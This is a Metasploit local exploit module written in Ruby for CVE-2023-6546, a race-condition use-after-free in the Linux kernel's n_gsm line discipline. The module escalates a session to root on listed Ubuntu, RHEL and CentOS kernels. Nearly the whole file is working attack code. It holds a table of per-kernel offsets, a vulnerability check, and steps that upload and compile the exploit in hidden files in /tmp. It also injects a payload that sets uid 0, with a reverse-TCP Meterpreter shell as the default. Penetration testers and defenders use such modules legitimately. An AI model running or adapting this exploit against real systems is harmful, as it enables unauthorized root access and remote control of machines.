##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GoodRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Compile
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Kernel GSM Multiplexing Race Condition Local Privilege Escalation',
        'Description' => %q{
          This module exploits a race condition leading to a use-after-free on
          the kmalloc-1024 slab. The bug exists in the n_gsm tty line discipline,
          created for gsm modems. The race condition results in a UAF on a struct
          gsm_dlci while restarting the gsm mux.

          The target system must have at least two CPU cores.

          Bypasses for SMEP, SMAP and KASLR are included.

          This module has been tested successfully on

          Ubuntu 20.04 Server
          Ubuntu 18.04 Server
          CentOS 8 Server
          RHEL 8 Server
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Nassim (p1k4l4) Asrir', # Discovery and exploit
          'Julien (jvoisin) Voisin' # Metasploit
        ],
        'DisclosureDate' => '2024-01-09',
        'Platform' => [ 'linux', 'python'],
        'Arch' => [ ARCH_X64, ARCH_PYTHON, ARCH_CMD ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'CVE', '2023-6546' ],
          [ 'ZDI', '24-020' ],
          [ 'URL', 'https://github.com/Nassim-Asrir/ZDI-24-020' ]
        ],
        'Notes' => {
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability' => [ CRASH_OS_DOWN ],
          'SideEffects' => [ ARTIFACTS_ON_DISK ]
        },
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'Payload' => 'python/meterpreter/reverse_tcp'
        }
      )
    )
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write and execute files', '/tmp' ])
    ]
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def get_distribution
    case sysinfo['OS']
    when /ubuntu/i
      'ubuntu'
    when /rhel/i
      'rhel'
    when /centos/i
      'centos'
    end
  end

  def get_kernel_offsets(distribution, kernel_version)
    offsets = {
      'rhel' => {
        '4.18.0-240.el8.x86_64' => [0x00001000, 0x000dc610, 0x01fc2de0, 0x0021f920, 0x00253d20],
        '4.18.0-240.1.1.el8_3.x86_64' => [0x00001000, 0x000dc610, 0x01fc2de0, 0x0021f920, 0x00253d20],
        '4.18.0-193.el8.x86_64' => [0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020d705, 0x00241060],
        '4.18.0-193.28.1.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6edc0, 0x0020dc05, 0x00241500],
        '4.18.0-193.19.1.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470],
        '4.18.0-193.14.3.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470],
        '4.18.0-193.13.2.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470],
        '4.18.0-193.6.3.el8_2.x86_64' => [0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db80, 0x002414e0],
        '4.18.0-193.1.2.el8_2.x86_64' => [0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db30, 0x00241490],
        '4.18.0-147.el8.x86_64' => [0x00001000, 0x000d63b0, 0x01c8a940, 0x00201dd0, 0x0023cd00],
        '4.18.0-147.8.1.el8_1.x86_64' => [0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023cd00],
        '4.18.0-147.5.1.el8_1.x86_64' => [0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0],
        '4.18.0-147.3.1.el8_1.x86_64' => [0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0],
        '4.18.0-147.0.3.el8_1.x86_64' => [0x00001000, 0x000d63e0, 0x01c8a940, 0x00201e05, 0x0023cd30],
        '4.18.0-147.0.2.el8_1.x86_64' => [0x00001000, 0x000d6340, 0x01c88940, 0x00201f70, 0x0023ceb0],
        '4.18.0-80.el8.x86_64' => [0x00001000, 0x000cfb05, 0x01c6c3a0, 0x001ef2e0, 0x00228d30],
        '4.18.0-80.11.2.el8_0.x86_64' => [0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0],
        '4.18.0-80.11.1.el8_0.x86_64' => [0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0],
        '4.18.0-80.7.2.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef590, 0x00228f90],
        '4.18.0-80.7.1.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef590, 0x00228f90],
        '4.18.0-80.4.2.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef305, 0x00228d50],
        '4.18.0-80.1.2.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef305, 0x00228d50]
      },
      'centos' => {
        '4.18.0-240.1.1.el8_3.x86_64' => [0x00001000, 0x000dc610, 0x01fc1de0, 0x0021f920, 0x00253d20],
        '4.18.0-240.el8.x86_64' => [0x00001000, 0x000dc610, 0x01fc1de0, 0x0021f920, 0x00253d20],
        '4.18.0-236.el8.x86_64' => [0x00001000, 0x000dc610, 0x01fd0e00, 0x0021f810, 0x00253c10],
        '4.18.0-227.el8.x86_64' => [0x00001000, 0x000dc505, 0x01fcee00, 0x0021f5a0, 0x002539a0],
        '4.18.0-211.el8.x86_64' => [0x00001000, 0x000dadd0, 0x01fa4b60, 0x00218880, 0x0024cb10],
        '4.18.0-193.el8.x86_64' => [0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020d705, 0x00241060],
        '4.18.0-193.28.1.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6edc0, 0x0020dc05, 0x00241500],
        '4.18.0-193.19.1.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470],
        '4.18.0-193.14.2.el8_2.x86_64' => [0x00001000, 0x000d78d0, 0x01e6cdc0, 0x0020db70, 0x00241470],
        '4.18.0-193.10.el8.x86_64' => [0x00001000, 0x000d8c60, 0x01e7bdc0, 0x00210a60, 0x00244030],
        '4.18.0-193.6.3.el8_2.x86_64' => [0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db80, 0x002414e0],
        '4.18.0-193.1.2.el8_2.x86_64' => [0x00001000, 0x000d78e0, 0x01e6cdc0, 0x0020db30, 0x00241490],
        '4.18.0-187.el8.x86_64' => [0x00001000, 0x000d7990, 0x01e6adc0, 0x0020d3c0, 0x00240d10],
        '4.18.0-177.el8.x86_64' => [0x00001000, 0x000d7990, 0x01e6a9c0, 0x0020d250, 0x00240b60],
        '4.18.0-168.el8.x86_64' => [0x00001000, 0x000d7960, 0x01e689a0, 0x0020d110, 0x002409d0],
        '4.18.0-151.el8.x86_64' => [0x00001000, 0x000d6f20, 0x01ca0980, 0x00207360, 0x00242620],
        '4.18.0-147.el8.x86_64' => [0x00001000, 0x000d63b0, 0x01c8a940, 0x00201dd0, 0x0023cd00],
        '4.18.0-147.8.1.el8_1.x86_64' => [0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023cd00],
        '4.18.0-147.6.el8.x86_64' => [0x00001000, 0x000d6480, 0x01c8c940, 0x002029d0, 0x0023dce0],
        '4.18.0-147.5.1.el8_1.x86_64' => [0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0],
        '4.18.0-147.3.1.el8_1.x86_64' => [0x00001000, 0x000d64c0, 0x01c8a940, 0x00201d90, 0x0023ccc0],
        '4.18.0-147.0.3.el8_1.x86_64' => [0x00001000, 0x000d63e0, 0x01c8a940, 0x00201e05, 0x0023cd30],
        '4.18.0-144.el8.x86_64' => [0x00001000, 0x000d6310, 0x01c88940, 0x00201f40, 0x0023ce80],
        '4.18.0-80.el8.x86_64' => [0x00001000, 0x000cfb05, 0x01c6b3a0, 0x001ef2e0, 0x00228d30],
        '4.18.0-80.11.2.el8_0.x86_64' => [0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0],
        '4.18.0-80.11.1.el8_0.x86_64' => [0x00001000, 0x000cfc05, 0x01c6e3a0, 0x001ef680, 0x002290a0],
        '4.18.0-80.7.2.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6e3a0, 0x001ef590, 0x00228f90],
        '4.18.0-80.7.1.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6d3a0, 0x001ef590, 0x00228f90],
        '4.18.0-80.4.2.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6d3a0, 0x001ef305, 0x00228d50],
        '4.18.0-80.1.2.el8_0.x86_64' => [0x00001000, 0x000cfb20, 0x01c6d3a0, 0x001ef305, 0x00228d50]
      },
      'ubuntu' => {
        '5.8.0-29-generic' => [0x2000, 0x0, 0x2171d00, 0x242f20, 0x27bb40, 0xd78d0, 0x1a63080],
        '5.4.0-54-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a20, 0x0024dc20],
        '5.4.0-52-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a20, 0x0024dc20],
        '5.4.0-51-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a20, 0x0024dc20],
        '5.4.0-48-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217b60, 0x0024dd30],
        '5.4.0-47-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50],
        '5.4.0-46-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217b60, 0x0024dd30],
        '5.4.0-45-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50],
        '5.4.0-44-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50],
        '5.4.0-43-generic' => [0x00001000, 0x000ce470, 0x01d43880, 0x00217a90, 0x0024dc50],
        '5.4.0-42-generic' => [0x00001000, 0x000ce450, 0x01d42880, 0x002170e0, 0x0024d250],
        '5.4.0-40-generic' => [0x00001000, 0x000ce450, 0x01d42880, 0x002170d0, 0x0024d240],
        '5.4.0-39-generic' => [0x00001000, 0x000ce420, 0x01d42880, 0x00216fd0, 0x0024d140],
        '5.4.0-37-generic' => [0x00001000, 0x000ce420, 0x01d42880, 0x00216fd0, 0x0024d140],
        '5.4.0-33-generic' => [0x00001000, 0x000ce405, 0x01d42900, 0x00217c70, 0x0024dd60],
        '5.4.0-31-generic' => [0x00001000, 0x000ce405, 0x01d42900, 0x00217c70, 0x0024dd60],
        '5.4.0-30-generic' => [0x00001000, 0x000ce405, 0x01d42900, 0x00217c70, 0x0024dd60],
        '5.4.0-29-generic' => [0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0],
        '5.4.0-28-generic' => [0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0],
        '5.4.0-26-generic' => [0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0],
        '5.4.0-25-generic' => [0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0],
        '5.4.0-24-generic' => [0x00001000, 0x000ce360, 0x01d40900, 0x002176c0, 0x0024d7c0],
        '5.4.0-18-generic' => [0x00001000, 0x000ce090, 0x01d40880, 0x002164b0, 0x0024c550],
        '5.4.0-17-generic' => [0x00001000, 0x000ce0d0, 0x01d40880, 0x00216505, 0x0024c590],
        '5.4.0-15-generic' => [0x00001000, 0x000ce0c0, 0x01d40840, 0x00216410, 0x0024c4a0],
        '5.4.0-9-generic' => [0x00001000, 0x000c4940, 0x01d34640, 0x0020c0f0, 0x00241f80],
        '5.3.0-52-generic' => [0x00001000, 0x000c8790, 0x01d26e40, 0x0020ee05, 0x00243d70],
        '5.3.0-51-generic' => [0x00001000, 0x000c8720, 0x01d26e40, 0x0020e960, 0x00243880],
        '5.3.0-48-generic' => [0x00001000, 0x000c8720, 0x01d26e40, 0x0020e960, 0x00243880],
        '5.3.0-46-generic' => [0x00001000, 0x000c8410, 0x01d26e00, 0x0020e440, 0x00243330],
        '5.3.0-45-generic' => [0x00001000, 0x000c8410, 0x01d26e00, 0x0020e380, 0x00243370],
        '5.3.0-43-generic' => [0x00001000, 0x000c8410, 0x01d26e40, 0x0020e7f0, 0x002436e0],
        '5.3.0-42-generic' => [0x00001000, 0x000c8410, 0x01d26e00, 0x0020e6a0, 0x00243690],
        '5.3.0-41-generic' => [0x00001000, 0x000c8410, 0x01d26e00, 0x0020e6a0, 0x00243690],
        '5.3.0-40-generic' => [0x00001000, 0x000c54a0, 0x01d23de0, 0x0020b440, 0x00240420],
        '5.3.0-29-generic' => [0x00001000, 0x000c53f0, 0x01d23dc0, 0x0020ad20, 0x0023fce0],
        '5.3.0-26-generic' => [0x00001000, 0x000c53f0, 0x01d23dc0, 0x0020ad20, 0x0023fce0],
        '5.3.0-24-generic' => [0x00001000, 0x000c53a0, 0x01d23dc0, 0x0020ac70, 0x0023fc20],
        '5.3.0-23-generic' => [0x00001000, 0x000c53a0, 0x01d23dc0, 0x0020acd0, 0x0023fcc0],
        '5.3.0-22-generic' => [0x00001000, 0x000c53a0, 0x01d23dc0, 0x0020acd0, 0x0023fcc0],
        '5.3.0-19-generic' => [0x00001000, 0x000c5260, 0x01d23dc0, 0x0020a3e0, 0x0023f3b0],
        '5.3.0-18-generic' => [0x00001000, 0x000c5260, 0x01d23dc0, 0x0020a3e0, 0x0023f3b0],
        '5.0.0-40-generic' => [0x00001000, 0x000c0cf0, 0x01d01660, 0x001f6890, 0x002338e0],
        '5.0.0-38-generic' => [0x00001000, 0x000c0cf0, 0x01d01660, 0x001f6830, 0x00233880],
        '5.0.0-13-generic' => [0x00001000, 0x000bf150, 0x01cfd660, 0x001f2710, 0x0022f320],
        '4.18.0-26-generic' => [0x00001000, 0x000b78c0, 0x01b19940, 0x001e5a90, 0x0021fb80],
        '4.18.0-25-generic' => [0x00001000, 0x000b78a0, 0x01b19940, 0x001e5a70, 0x0021fb60],
        '4.18.0-20-generic' => [0x00001000, 0x000b6fb0, 0x01b19940, 0x001e3ad0, 0x0021dbd0],
        '4.18.0-10-generic' => [0x00001000, 0x000b5ec0, 0x01b15940, 0x001e22a0, 0x0021c330],
        '4.15.0-124-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd670, 0x00206f20],
        '4.15.0-122-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd670, 0x00206f20],
        '4.15.0-121-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd670, 0x00206f20],
        '4.15.0-118-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd580, 0x00206e20],
        '4.15.0-117-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10],
        '4.15.0-116-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd580, 0x00206e20],
        '4.15.0-115-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10],
        '4.15.0-114-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10],
        '4.15.0-113-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd570, 0x00206e10],
        '4.15.0-112-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd1c0, 0x00206a30],
        '4.15.0-111-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd1c0, 0x00206a30],
        '4.15.0-109-generic' => [0x00001000, 0x000b5230, 0x01af14c0, 0x001cd1c0, 0x00206a30],
        '4.15.0-108-generic' => [0x00001000, 0x000b5205, 0x01af14c0, 0x001cd160, 0x00206aa0],
        '4.15.0-106-generic' => [0x00001000, 0x000b5205, 0x01af14c0, 0x001cd160, 0x00206aa0],
        '4.15.0-101-generic' => [0x00001000, 0x000b5205, 0x01aed4c0, 0x001cd130, 0x00206a50],
        '4.15.0-100-generic' => [0x00001000, 0x000b5205, 0x01aed4c0, 0x001cd130, 0x00206a50],
        '4.15.0-99-generic' => [0x00001000, 0x000b51e0, 0x01aed4c0, 0x001cd360, 0x00206c80],
        '4.15.0-97-generic' => [0x00001000, 0x000b51e0, 0x01aed4c0, 0x001cd360, 0x00206c80],
        '4.15.0-96-generic' => [0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccca0, 0x00206550],
        '4.15.0-92-generic' => [0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccca0, 0x00206550],
        '4.15.0-91-generic' => [0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccb05, 0x002064c0],
        '4.15.0-89-generic' => [0x00001000, 0x000b4f70, 0x01aed4c0, 0x001ccb05, 0x002064c0],
        '4.15.0-88-generic' => [0x00001000, 0x000b4f60, 0x01aec4c0, 0x001cca40, 0x002063f0],
        '4.15.0-87-generic' => [0x00001000, 0x000b4f60, 0x01aec4c0, 0x001cca40, 0x002063f0],
        '4.15.0-76-generic' => [0x00001000, 0x000b4f60, 0x01aec4a0, 0x001cc5a0, 0x00205fa0],
        '4.15.0-74-generic' => [0x00001000, 0x000b4f60, 0x01aec4a0, 0x001cc5a0, 0x00205fa0],
        '4.15.0-72-generic' => [0x00001000, 0x000b4f20, 0x01aec4a0, 0x001cc530, 0x00205f30],
        '4.15.0-70-generic' => [0x00001000, 0x000b4f70, 0x01aee4a0, 0x001cc460, 0x00205e30],
        '4.15.0-69-generic' => [0x00001000, 0x000b4f70, 0x01aee4a0, 0x001cc460, 0x00205e30],
        '4.15.0-66-generic' => [0x00001000, 0x000b4ed0, 0x01aee4a0, 0x001cc505, 0x00205ec0],
        '4.15.0-65-generic' => [0x00001000, 0x000b4f30, 0x01aee4a0, 0x001cc550, 0x00205f10],
        '4.15.0-64-generic' => [0x00001000, 0x000b4f10, 0x01aed4a0, 0x001cc2a0, 0x00205c20],
        '4.15.0-62-generic' => [0x00001000, 0x000b4f10, 0x01aed4a0, 0x001cc2a0, 0x00205c20],
        '4.15.0-60-generic' => [0x00001000, 0x000b4f10, 0x01aed4a0, 0x001cc2a0, 0x00205c20],
        '4.15.0-58-generic' => [0x00001000, 0x000b2c50, 0x01aea4a0, 0x001c6f40, 0x00200640],
        '4.15.0-55-generic' => [0x00001000, 0x000b24d0, 0x01ae44a0, 0x001c6340, 0x001ff970],
        '4.15.0-54-generic' => [0x00001000, 0x000b2260, 0x01ae44a0, 0x001c60d0, 0x001ff700],
        '4.15.0-52-generic' => [0x00001000, 0x000b2230, 0x01ae44a0, 0x001c5df0, 0x001ff3f0],
        '4.15.0-51-generic' => [0x00001000, 0x000b2230, 0x01ae44a0, 0x001c5df0, 0x001ff3f0],
        '4.15.0-50-generic' => [0x00001000, 0x000b2230, 0x01ae64a0, 0x001c5df0, 0x001ff3f0],
        '4.15.0-48-generic' => [0x00001000, 0x000b2210, 0x01ae44a0, 0x001c5dd0, 0x001ff3d0],
        '4.15.0-47-generic' => [0x00001000, 0x000b0c90, 0x01ae44a0, 0x001c4810, 0x001fddc0],
        '4.15.0-46-generic' => [0x00001000, 0x000b0c80, 0x01ae44a0, 0x001c3fa0, 0x001fd310],
        '4.15.0-45-generic' => [0x00001000, 0x000b0af0, 0x01ae44a0, 0x001c3e20, 0x001fd0e0],
        '4.15.0-44-generic' => [0x00001000, 0x000b0af0, 0x01ae44a0, 0x001c3e20, 0x001fd0e0],
        '4.15.0-43-generic' => [0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3ce0, 0x001fcfa0],
        '4.15.0-42-generic' => [0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3be0, 0x001fcea0],
        '4.15.0-39-generic' => [0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3b70, 0x001fce60],
        '4.15.0-38-generic' => [0x00001000, 0x000b0ac0, 0x01ae44a0, 0x001c3b70, 0x001fce60],
        '4.15.0-36-generic' => [0x00001000, 0x000b0a10, 0x01ae44a0, 0x001c3a30, 0x001fcd20],
        '4.15.0-34-generic' => [0x00001000, 0x000b09a0, 0x01ae44a0, 0x001c3940, 0x001fcc40],
        '4.15.0-33-generic' => [0x00001000, 0x000b08e0, 0x01ae44a0, 0x001c36d0, 0x001fc9d0],
        '4.15.0-32-generic' => [0x00001000, 0x000b08f0, 0x01ae44a0, 0x001c36b0, 0x001fc930],
        '4.15.0-30-generic' => [0x00001000, 0x000b0140, 0x01ae44a0, 0x001c2ec0, 0x001fc090],
        '4.15.0-29-generic' => [0x00001000, 0x000b0140, 0x01ae44a0, 0x001c2ec0, 0x001fc090],
        '4.15.0-24-generic' => [0x00001000, 0x000b0140, 0x01ae44a0, 0x001c2ec0, 0x001fc090],
        '4.15.0-23-generic' => [0x00001000, 0x000b0150, 0x01ae44a0, 0x001c3170, 0x001fc2e0],
        '4.15.0-22-generic' => [0x00001000, 0x000af120, 0x01ae34a0, 0x001c1fc0, 0x001fb130],
        '4.15.0-20-generic' => [0x00001000, 0x000af080, 0x01ae34a0, 0x001c1ee0, 0x001fb050]
      }
    }

    if offsets.include?(distribution) && offsets[distribution].include?(kernel_version)
      return ["\"#{kernel_version}\""] + offsets[distribution][kernel_version]
    end

    nil
  end

  def check
    unless sysinfo['Architecture'] == ARCH_X64
      return CheckCode::Safe("System architecture #{sysinfo['Architecture']} is not supported")
    end

    vprint_good "System architecture #{sysinfo['Architecture']} is supported"

    distribution = get_distribution
    kernel_offsets = get_kernel_offsets(distribution, kernel_release)
    if kernel_offsets.nil?
      return CheckCode::Safe("#{distribution.capitalize} running Linux #{kernel_release} is not vulnerable")
    end

    vprint_good "#{distribution.capitalize} running Linux #{kernel_release} is vulnerable."

    cores = get_cpu_info[:cores].to_i
    min_required_cores = 2
    unless cores >= min_required_cores
      return CheckCode::Safe("System has less than #{min_required_cores} CPU cores.")
    end

    vprint_good "System has #{cores} CPU cores"

    CheckCode::Appears
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # distribution = cmd_exec('grep ^ID= /etc/os-release')[3..]
    distribution = get_distribution
    kernel_offsets = get_kernel_offsets(distribution, kernel_release)
    if kernel_offsets.nil?
      fail_with(Failure::BadConfig, "We don't have offsets for #{distribution.capitalize} running Linux #{kernel_release}.")
    end

    exploit_name = ".#{rand_text_alphanumeric(5..10)}"
    exploit_path = "#{base_dir}/#{exploit_name}"
    data = exploit_data('CVE-2023-6546', 'exploit.c')
    data.sub!(/METASPLOIT_SELECT_KERNEL;/, "static struct kern_params offsets = {#{kernel_offsets.join(', ')}};\nselected_kernel = &offsets;")

    if payload.platform.platforms == [Msf::Module::Platform::Python]
      vprint_status('Inlining the payload inside the exploit.')
      data.sub!(/^#define PYTHON_PAYLOAD .+$/, "#define PYTHON_PAYLOAD \"import os,sys,stat; os.setresgid(0, 0, 0); os.setresuid(0, 0, 0); os.chmod(sys.executable, ~stat.S_ISUID); #{payload.encoded};\"")
    else
      vprint_status('Using a payload binary.')
      payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
      upload_and_chmodx payload_path, generate_payload_exe
      register_files_for_cleanup(payload_path)
      data.sub!(/METASPLOIT_PAYLOAD/, payload_path)
    end

    vprint_status 'Live compiling exploit on system...'
    upload_and_compile exploit_path, strip_comments(data), '-lpthread'
    register_file_for_cleanup exploit_path

    print_status 'Launching exploit'
    cmd_exec exploit_path
  end
end
